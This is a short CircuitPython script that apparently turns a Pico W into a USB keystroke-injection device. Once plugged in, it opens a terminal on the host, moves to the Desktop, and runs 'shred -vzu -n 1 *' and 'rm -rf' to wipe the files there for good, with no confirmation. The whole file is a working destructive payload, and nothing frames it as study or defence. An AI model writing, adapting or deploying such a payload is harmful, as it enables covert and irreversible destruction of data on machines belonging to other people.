# used to delete whole file directories through the terminal
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def type_cmd(text):
    layout.write(text)
    kbd.send(Keycode.ENTER)
    time.sleep(0.5)
    
print("Waiting 5 seconds... SWITCH TO YOUR DESKTOP!")
time.sleep(5)

kbd.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
kbd.release_all()
time.sleep(2)

type_cmd("cd ~/Desktop")
type_cmd("shred -vzu -n 1 *")
type_cmd("rm -rf PicoW")
type_cmd("shred -vzu -n 1 *")
type_cmd("exit")
         
print("Wipe Complete!")
